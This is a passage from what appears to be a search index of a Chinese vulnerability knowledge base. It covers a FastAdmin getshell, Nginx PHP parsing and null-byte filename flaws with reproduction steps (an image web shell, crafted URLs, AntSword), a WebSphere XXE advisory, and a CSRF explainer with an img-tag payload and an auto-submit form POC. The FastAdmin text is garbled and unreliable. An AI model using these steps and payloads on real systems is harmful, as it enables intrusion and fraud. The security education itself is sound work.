<p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/fastadmin/fastadmin%E6%9C%80%E6%96%B0%E7%89%88%E5%89%8D%E5%8F%B0getshell/","title":"fastadmin\u6700\u65b0\u7248\u524d\u53f0getshell","text":"<p>\u524d\u63d0\uff1a\u5f00\u542f\u2f64\u6237\u6ce8\u518c \u6f0f\u6d1e\u539f\u56e0\uff1a \u76f4\u63a5\u5c06$name\u53c2\u6570\u5e26\u2f0a\u5230fetch\u51fd\u6570,fetch\u51fd\u6570\u662fThinkPHP\u89e3\u6790\u6a21\u7248\u7684\u51fd\u6570\uff0c\u2fa5\u2faf\u2f40\u6301\u539f\u2f63PHP\uff0c\u6240\u4ee5\u9020\u6210 RCE\uff0c\u76f4\u63a5\u4e0a\u4f20\u6210\u529f\u5c31\u53ef\u4ee5\u8c03\u2f64\u8fd9\u4e2a\u70b9\u89e3\u6790\u3002  Php\u4ee3\u739b\u53ef\u4ee5\u548c\u6807\u76ca\u5728\u6a21\u677f\u2f42\u4ef6\u4e2d\u6f0f\u5408\u4f7f\u2f64,\u53ef\u4ee5\u5728\u6a21\u677f\u2f42\u4ef6\u2fa5\u2faf\u5343\u5199\u4efb\u610f\u7684P\u53e5\u4ee3\u7801,\u5305\u62ec\u4e0b\u2faf\u4e24\u79cd\u2f45\u5f0f: \u4f7f\u2f64php\u6807\u7b7e \u4f8b\u5982:  </p> <p>\u6211\u4eec\u5efa\u8fd9\u9700\u8981\u4f7f\u2f64PHP\u4ee3\u7684\u65f6\u5019\u5c3d\u91cf\u91c7\u2f64hp\u7b7e,\u56e0\u4e3a\u539f\u2f63\u7684PHP\u6cd5\u53ef\u80fd\u4f1a\u88ab\u914d\u7f6e\u7981\u2f64\u2f7d\u5bfc\u81f4\u89e3\u6790\u9519\u8bef. \u4f7f\u2f64\u539f\u2f63php\u4ee3\u7801  </p> <p>\u6ce8\u610f:php\u6807\u7b7e\u6216\u8005h\u4ee3\u7801\u2fa5\u2faf\u5c31\u4e0d\u80fd\u518d\u4f7f\u2f64\u6807\u7b7e(\u5305\u666e\u901a\u6807\u76d7\u548c\u4e48\u6807)\u4e86,\u56e0\u6b64\u4e0b\u2faf\u7684\u2f0f\u79cd\u2f45\u5f0f\u90fd\u662f\u2f46\u6548\u7684; </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E4%B8%ADphp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","title":"Nginx\u4e2dphp\u914d\u7f6e\u9519\u8bef\u5bfc\u81f4\u7684\u89e3\u6790\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E4%B8%ADphp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_1","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>\u8fd9\u4e00\u6f0f\u6d1e\u662f\u7531\u4e8eNginx\u4e2dphp\u914d\u7f6e\u4e0d\u5f53\u800c\u9020\u6210\u7684\uff0c\u4e0eNginx\u7248\u672c\u65e0\u5173</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E4%B8%ADphp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u8be6\u60c5","text":"<p>Nginx\u62ff\u5230\u6587\u4ef6\u8def\u5f84\uff08\u66f4\u4e13\u4e1a\u7684\u8bf4\u6cd5\u662fURI\uff09/test.jpg/test.php\u540e\uff0c\u4e00\u770b\u540e\u7f00\u662f.php\uff0c\u4fbf\u8ba4\u4e3a\u8be5\u6587\u4ef6\u662fphp\u6587\u4ef6\uff0c\u8f6c\u4ea4\u7ed9php\u53bb\u5904\u7406\u3002php\u4e00\u770b/test.jpg/test.php\u4e0d\u5b58\u5728\uff0c\u4fbf\u5220\u53bb\u6700\u540e\u7684/test.php\uff0c\u53c8\u770b/test.jpg\u5b58\u5728\uff0c\u4fbf\u628a/test.jpg\u5f53\u6210\u8981\u6267\u884c\u7684\u6587\u4ef6\u4e86</p> <p>\u8fd9\u5176\u4e2d\u6d89\u53ca\u5230php\u7684\u4e00\u4e2a\u9009\u9879\uff1acgi.fix_pathinfo\uff0c\u8be5\u503c\u9ed8\u8ba4\u4e3a1\uff0c\u8868\u793a\u5f00\u542f\u3002\u5f00\u542f\u8fd9\u4e00\u9009\u9879\u6709\u4ec0\u4e48\u7528\u5462\uff1f\u770b\u540d\u5b57\u5c31\u77e5\u9053\u662f\u5bf9\u6587\u4ef6\u8def\u5f84\u8fdb\u884c\u201c\u4fee\u7406\u201d\u3002\u4f55\u8c13\u201c\u4fee\u7406\u201d\uff1f\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5f53php\u9047\u5230\u6587\u4ef6\u8def\u5f84\u201c/aaa.xxx/bbb.yyy/ccc.zzz\u201d\u65f6\uff0c\u82e5\u201c/aaa.xxx/bbb.yyy/ccc.zzz\u201d\u4e0d\u5b58\u5728\uff0c\u5219\u4f1a\u53bb\u6389\u6700\u540e\u7684\u201c/ccc.zzz\u201d\uff0c\u7136\u540e\u5224\u65ad\u201c/aaa.xxx/bbb.yyy\u201d\u662f\u5426\u5b58\u5728\uff0c\u82e5\u5b58\u5728\uff0c\u5219\u628a\u201c/aaa.xxx/bbb.yyy\u201d\u5f53\u505a\u6587\u4ef6\u201c/aaa.xxx/bbb.yyy/ccc.zzz\u201d\uff0c\u82e5\u201c/aaa.xxx/bbb.yyy\u201d\u4ecd\u4e0d\u5b58\u5728\uff0c\u5219\u7ee7\u7eed\u53bb\u6389\u201c/bbb.yyy\u201d\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002</p> <p>\u8be5\u9009\u9879\u5728\u914d\u7f6e\u6587\u4ef6php.ini\u4e2d</p> <p>\u65b0\u7248\u672c\u7684php\u5f15\u5165\u4e86\u201csecurity.limit_extensions\u201d\uff0c\u9650\u5236\u4e86\u53ef\u6267\u884c\u6587\u4ef6\u7684\u540e\u7f00\uff0c\u9ed8\u8ba4\u53ea\u5141\u8bb8\u6267\u884c.php\u6587\u4ef6</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E4%B8%ADphp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_3","title":"\u590d\u73b0\u8fc7\u7a0b","text":"<p>1\u3001 \u4f7f\u7528docker\u642d\u5efa\u6f0f\u6d1e\u73af\u5883</p> <p>2\u3001 \u6267\u884c\u5982\u4e0b\u547d\u4ee4,\u8fd0\u884c\u73af\u5883</p> <p>docker-compose up -d</p> <p>3\u3001 \u6d4f\u89c8\u5668\u8bbf\u95eehttp://192.168.247.129/</p> <p> 4.\u4e0a\u4f20\u4e00\u4e2a\u56fe\u7247\u9a6c</p> <p>5.\u6d4f\u89c8\u5668\u8bbf\u95eehttp://192.168.247.129/uploadfiles/156005c5baf40ff51a327f1c34f2975b.jpg/a.php</p> <p>\u4e0b\u56fe\u770b\u5230\u6210\u529f\u6267\u884c\u4e86php\u4ee3\u7801,\u8bf4\u660e\u5b58\u5728\u89e3\u6790\u6f0f\u6d1e  6.\u6211\u4eec\u7528\u4e2d\u56fd\u8681\u5251\u53bb\u8fde\u63a5 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E4%B8%ADphp%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/#_4","title":"\u6f0f\u6d1e\u4fee\u590d","text":"<p>\u4e3b\u8981\u662f\u4e24\u4e2a\u914d\u7f6e\u6587\u4ef6\u4e2d\u914d\u7f6e\u4e0d\u5f53\u9020\u6210\u7684\u3002</p> <ol> <li>\u4fee\u6539\u914d\u7f6e\u6587\u4ef6vim /etc/php5/fpm/php.ini</li> </ol> <p>\u5c06cgi.fix_pathinfo=1\uff0c\u8bbe\u7f6e\u4e3a0</p> <p>2.\u4fee\u6539\u914d\u7f6e\u6587\u4ef6vim /etc/php5/fpm/pool.d/www.conf</p> <p>\u5c06security.limit_extensions=\uff0c\u8bbe\u7f6e\u4e3a\uff1a</p> <p>security.limit_extensions=.php\uff0c\u53ea\u5141\u8bb8php\u6587\u4ef6\u89e3\u6790</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","title":"Nginx\u6587\u4ef6\u540d\u903b\u8f91\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/#_1","title":"\u5f71\u54cd\u7248\u672c","text":"<p>Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u8be6\u60c5","text":"<p>\u8be5\u6f0f\u6d1e\u5229\u7528\u4e86Nginx\u9519\u8bef\u7684\u89e3\u6790\u4e86URL\u5730\u5740\uff0c\u5bfc\u81f4\u53ef\u4ee5\u7ed5\u8fc7\u670d\u52a1\u7aef\u9650\u5236\uff0c\u4ece\u800c\u89e3\u6790PHP\u6587\u4ef6\uff0c\u9020\u6210\u547d\u4ee4\u6267\u884c\u7684\u5371\u5bb3\u3002</p> <p>\u6839\u636enginx.conf\u6587\u4ef6\u4e2dlocation\u4e2d\u7684\u5b9a\u4e49\uff0c\u4ee5.php\u7ed3\u5c3e\u7684\u6587\u4ef6\u90fd\u89e3\u6790\u4e3aphp\u3002\u82e5\u6211\u4eec\u8bbf\u95ee\u7684\u6587\u4ef6\u540d\u4e3ashell.gif[0x20][0x00].php\uff0c\u8be5\u6587\u4ef6\u540d\u4ee5.php\u7ed3\u5c3e\u53ef\u4ee5\u88abFastCGI\u63a5\u6536\uff0cFastCGI\u5728\u8bfb\u53d6\u6587\u4ef6\u540d\u65f6\u88ab00\u622a\u65ad\uff0c\u5bfc\u81f4\u8bfb\u53d6\u7684\u6587\u4ef6\u540d\u4e3a1.gif[0x20]\uff0c\u914d\u5408limit_extensions\u4e3a\u7a7a\u5373\u53ef\u5229\u7528\u6210\u529f\u914d\u5408limit_extensions\u4e3a\u7a7a\u5373\u53ef\u5229\u7528\u6210\u529f\u3002\u8be5\u6f0f\u6d1e\u5229\u7528\u6761\u4ef6\u6709\u4e24\u4e2a\uff1a</p> <p>1.Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p> <p>2.php-fpm.conf\u4e2d\u7684security.limit_extensions\u4e3a\u7a7a\uff0c\u4e5f\u5c31\u662f\u8bf4\u4efb\u610f\u540e\u7f00\u540d\u90fd\u53ef\u4ee5\u89e3\u6790\u4e3aPHP</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/#_3","title":"\u590d\u73b0\u8fc7\u7a0b","text":"<p>1\u3001 \u4f7f\u7528docker\u642d\u5efa\u6f0f\u6d1e\u73af\u5883</p> <p>2\u3001 \u6267\u884c\u5982\u4e0b\u547d\u4ee4,\u8fd0\u884c\u73af\u5883</p> <pre><code>docker-compose up -d\n</code></pre> <p>3\u3001 \u6d4f\u89c8\u5668\u8bbf\u95eehttp://192.168.247.129:8080/  4.\u4e0a\u4f20\u4e2a\u56fe\u7247\u9a6c  \u53d1\u73b0\u4e0a\u4f20\u6210\u529f\u5e76\u8fd4\u56de\u8def\u5f84</p> <p>5.5.\u63a5\u4e0b\u6765\u9700\u8981\u6784\u9020\u6211\u4eec test.gif[0x20][0x00].php \u6765\u9020\u6210Nginx\u89e3\u6790\u6f0f\u6d1e\uff0c\u4f7f\u6211\u4eec\u7684test.gif\u88ab\u89e3\u6790\u6210php</p> <p>url:http://192.168.247.129:8080/uploadfiles/test.gif%20%20.php</p> <p>\u624b\u5de5\u66f4\u6539\u6210\u4e0b\u56fe  \u9009\u4e2d%00\u8fdb\u884c\u89e3\u7801  \u8f6c\u53d1\u6570\u636e\u5305   \u89e3\u6790\u6210\u529f\uff01</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/","title":"Nginx\u8d8a\u754c\u8bfb\u53d6\u7f13\u5b58\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>Nginx version 0.5.6 - 1.13.2</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/nginx/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>POC \u4f7f\u7528\u65b9\u6cd5\uff1apython3 poc.py targeturl</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/websphere/IBM%20WebSphere%E5%AD%98%E5%9C%A8XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E%20CVE-2020-4643/","title":"IBM WebSphere\u5b58\u5728XXE\u5916\u90e8\u5b9e\u4f53\u6ce8\u2f0a\u6f0f\u6d1e CVE-2020-4643","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/websphere/IBM%20WebSphere%E5%AD%98%E5%9C%A8XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E%20CVE-2020-4643/#_1","title":"\u6f0f\u6d1e\u5206\u6790\uff1a","text":"<p>IBM WebSphere \u5e94\u2f64\u7a0b\u5e8f\u670d\u52a1\u56687.0\u30018.0\u30018.5 \u548c9.0 \u5728\u5904\u7406XML \u6570\u636e\u65f6\u5bb9\u6613\u53d7\u5230XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u2f0a \uff08XXE\uff09 \u653b\u51fb\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u2f64\u6b64\u6f0f\u6d1e\u516c\u5f00\u654f\u611f\u4fe1\u606f\u3002IBM Xforce\u00a0ID\uff1a185590\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/websphere/IBM%20WebSphere%E5%AD%98%E5%9C%A8XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E%20CVE-2020-4643/#_2","title":"\u5f71\u54cd\u8303\u56f4\uff1a","text":"<p>WebSphere Application Server 7.0\u7248\u672c WebSphere Application Server 8.0\u7248\u672c WebSphere Application Server 8.5\u7248\u672c WebSphere Application Server 9.0\u7248\u672c</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/websphere/IBM%20WebSphere%E5%AD%98%E5%9C%A8XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E%20CVE-2020-4643/#_3","title":"\u4fee\u590d\u5efa\u8bae\uff1a","text":"<p>\u5b98\u2f45\u5df2\u7ecf\u63d0\u4f9b\u7684\u8865\u4e01\u7248\u672c\u5217\u8868\uff1a WebSphere 9.0.0.0 - 9.0.5.5\u7248\u672c\uff0c\u5efa\u8bae\u5347\u7ea7\u52309.0.5.6\u4ee5\u4e0a\u7248\u672c\u6216\u5b89\u88c5\u8865\u4e01 WebSphere 8.5.0.0 - 8.5.5.17\u7248\u672c\uff0c\u5efa\u8bae\u5347\u7ea7\u52308.5.5.19\u4ee5\u4e0a\u7248\u672c\u6216\u5b89\u88c5\u8865\u4e01 WebSphere 8.0.0.0 - 8.0.0.15\u7248\u672c\uff0c\u5efa\u8bae\u5148\u5347\u7ea7\u52308.0.0.15\u7248\u672c\u518d\u5b89\u88c5\u8865\u4e01 WebSphere 7.0.0.0 - 7.0.0.45 \u7248\u672c\uff0c\u5efa\u8bae\u5148\u5347\u7ea7\u52307.0.0.45\u7248\u672c\u518d\u5b89\u88c5\u8865\u4e01</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/","title":"CSRF\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u8be6\u89e3","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/#_1","title":"\u7b80\u4ecb\uff1a","text":"<p>\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff08\u82f1\u8bed\uff1aCross-site request forgery\uff09\uff0c\u4e5f\u88ab\u79f0\u4e3a one-click attack**\u6216\u8005 **session riding\uff0c\u901a\u5e38\u7f29\u5199\u4e3a CSRF**\u6216\u8005 **XSRF\uff0c \u662f\u4e00\u79cd\u631f\u5236\u7528\u6237\u5728\u5f53\u524d\u5df2\u767b\u5f55\u7684Web\u5e94\u7528\u7a0b\u5e8f\u4e0a\u6267\u884c\u975e\u672c\u610f\u7684\u64cd\u4f5c\u7684\u653b\u51fb\u65b9\u6cd5\u3002\u8ddf\u8de8\u7f51\u7ad9\u811a\u672c\uff08XSS\uff09\u76f8\u6bd4\uff0c**XSS**\u5229\u7528\u7684\u662f\u7528\u6237\u5bf9\u6307\u5b9a\u7f51\u7ad9\u7684\u4fe1\u4efb\uff0cCSRF \u5229\u7528\u7684\u662f\u7f51\u7ad9\u5bf9\u7528\u6237\u7f51\u9875\u6d4f\u89c8\u5668\u7684\u4fe1\u4efb\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/#_2","title":"\u6f0f\u6d1e\u539f\u7406\u4e3e\u4f8b\uff1a","text":"<p>\u5047\u5982\u4e00\u5bb6\u94f6\u884c\u7528\u4ee5\u8fd0\u884c\u8f6c\u8d26\u64cd\u4f5c\u7684URL\u5730\u5740\u5982\u4e0b\uff1ahttp://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName</p> <p>\u90a3\u4e48\uff0c\u4e00\u4e2a\u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u53e6\u4e00\u4e2a\u7f51\u7ad9\u4e0a\u653e\u7f6e\u5982\u4e0b\u4ee3\u7801\uff1a</p> <pre><code>&lt;img src=\"http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman\"&gt;\n</code></pre> <p>\u5982\u679c\u6709\u8d26\u6237\u540d\u4e3aAlice\u7684\u7528\u6237\u8bbf\u95ee\u4e86\u6076\u610f\u7ad9\u70b9\uff0c\u800c\u5979\u4e4b\u524d\u521a\u8bbf\u95ee\u8fc7\u94f6\u884c\u4e0d\u4e45\uff0c\u767b\u5f55\u4fe1\u606f\u5c1a\u672a\u8fc7\u671f\uff0c\u90a3\u4e48\u5979\u5c31\u4f1a\u635f\u59311000\u8d44\u91d1\u3002</p> <p>\u8fd9\u79cd\u6076\u610f\u7684\u7f51\u5740\u53ef\u4ee5\u6709\u5f88\u591a\u79cd\u5f62\u5f0f\uff0c\u85cf\u8eab\u4e8e\u7f51\u9875\u4e2d\u7684\u8bb8\u591a\u5730\u65b9\u3002\u6b64\u5916\uff0c\u653b\u51fb\u8005\u4e5f\u4e0d\u9700\u8981\u63a7\u5236\u653e\u7f6e\u6076\u610f\u7f51\u5740\u7684\u7f51\u7ad9\u3002\u4f8b\u5982\u4ed6\u53ef\u4ee5\u5c06\u8fd9\u79cd\u5730\u5740\u85cf\u5728\u8bba\u575b\uff0c\u535a\u5ba2\u7b49\u4efb\u4f55\u7528\u6237\u751f\u6210\u5185\u5bb9\u7684\u7f51\u7ad9\u4e2d\u3002\u8fd9\u610f\u5473\u7740**\u5982\u679c\u670d\u52a1\u7aef\u6ca1\u6709\u5408\u9002\u7684\u9632\u5fa1\u63aa\u65bd\u7684\u8bdd\uff0c\u7528\u6237\u5373\u4f7f\u8bbf\u95ee\u719f\u6089\u7684\u53ef\u4fe1\u7f51\u7ad9\u4e5f\u6709\u53d7\u653b\u51fb\u7684\u5371\u9669**\u3002</p> <p>\u900f\u8fc7\u4f8b\u5b50\u80fd\u591f\u770b\u51fa\uff0c\u653b\u51fb\u8005\u5e76\u4e0d\u80fd\u901a\u8fc7CSRF\u653b\u51fb\u6765\u76f4\u63a5\u83b7\u53d6\u7528\u6237\u7684\u8d26\u6237\u63a7\u5236\u6743\uff0c\u4e5f\u4e0d\u80fd\u76f4\u63a5\u7a83\u53d6\u7528\u6237\u7684\u4efb\u4f55\u4fe1\u606f\u3002\u4ed6\u4eec\u80fd\u505a\u5230\u7684\uff0c\u662f**\u6b3a\u9a97\u7528\u6237\u6d4f\u89c8\u5668\uff0c\u8ba9\u5176\u4ee5\u7528\u6237\u7684\u540d\u4e49\u8fd0\u884c\u64cd\u4f5c**\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/#_3","title":"\u6f0f\u6d1e\u68c0\u6d4b\uff1a","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/#tokenreferer","title":"\u6570\u636e\u5305\u65e0token\u548creferer\u9a8c\u8bc1\uff1a","text":"<p>\u65e0token\u9a8c\u8bc1\u5e76\u4e14\u65e0referer\u9a8c\u8bc1\u65f6\uff0c\u5c31\u57fa\u672c\u5b58\u5728\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff0c\u4f46\u57fa\u4e8e\u529f\u80fd\u70b9\u4e0d\u540c\uff0c\u4e00\u4e9b\u4e3a\u65e0\u610f\u4e49\u65e0\u5371\u5bb3\u7684\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u3002</p> <p>\u63d0\u4ea4\u6570\u636e\u5305\u65f6\u6293\u5305\u5220\u9664referer\u5b57\u6bb5\uff0c\u5982\u679c\u4e0d\u62a5\u9519\uff0c\u5219\u57fa\u672c\u5b58\u5728\u8de8\u57df\u8bf7\u6c42\u4f2a\u9020\uff0cGET\u578b\u6784\u9020\u94fe\u63a5\uff0cPOST\u578b\u5199\u4e00\u4e2a\u63d0\u4ea4\u8868\u5355\uff0c\u6d4b\u8bd5\u6709\u8de8\u57df\u60c5\u51b5\u4e0b\u63d0\u4ea4\u7684\u6570\u636e\u5305\u662f\u5426\u751f\u6548\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/#tokenreferer_1","title":"\u6570\u636e\u5305\u65e0token\u6709referer\u9a8c\u8bc1\uff1a","text":"<p>\u53ea\u6709referer\u9a8c\u8bc1\u65f6\uff0c\u53ef\u5c1d\u8bd5\u7a7areferer\uff0c\u6216\u8005\u5c1d\u8bd5\u57df\u540d\u4f2a\u9020\u3002</p> <p>\u4f8b\u5982\u53ea\u9a8c\u8bc1referer\u662f\u5426\u5b58\u5728bylibrary.cn\u65f6\uff1a</p> <p>\u4f2a\u9020\u4e09\u7ea7\u57df\u540d\u4e3abylibrary.cn.baidu.com\u6765\u7ed5\u8fc7referer\u5b57\u6bb5\u9a8c\u8bc1\uff1b</p> <p>\u5728bylibrary.cn\u7f51\u7ad9\u4e0b\u53d1\u5e16\u5f15\u5bfc\u522b\u4eba\u70b9\u51fb\u6211\u4eec\u6784\u9020\u7684CSRF\u94fe\u63a5\u6216\u8005\u5728\u6b64\u7f51\u7ad9\u4e0b\u53d1\u5e03\u6211\u4eec\u6784\u9020\u7684CSRF\u8868\u5355\u5730\u5740\u6765\u7ed5\u8fc7referer\u7684\u68c0\u6d4b\u3002</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/#_4","title":"\u6f0f\u6d1e\u5229\u7528\uff1a","text":""},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/#poc","title":"\u81ea\u52a8\u63d0\u4ea4\u8868\u5355POC\uff1a","text":"<pre><code>&lt;html&gt;\n&lt;head&gt;&lt;/head&gt;\n&lt;body onload=\"form1.submit()\"&gt;\n&lt;form id=\"form1\" method=\"post\" action=\"http://example.com\"&gt;\n&lt;input type=\"hidden\" name=\"sex\" value=\"2\" /&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/#_5","title":"\u5e38\u89c1\u573a\u666f\uff1a","text":"<p>\u5728\u9700\u8981\u9a8c\u8bc1\u7528\u6237\u8eab\u4efd\u7684post\u8868\u5355\u6216\u8005get\u8bf7\u6c42\u5904\u7406\u65f6\uff0c\u4f8b\u5982\u4fee\u6539\u5bc6\u7801\uff0c\u4fee\u6539\u4e2a\u4eba\u4fe1\u606f\uff0c\u5220\u9664\u6587\u4ef6\uff0c\u6dfb\u52a0\u7528\u6237\u7b49</p>"},{"location":"%E7%9F%A5%E8%AF%86%E5%BA%93/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/#_6","title":"\u6f0f\u6d1e\u5b9e\u4f8b\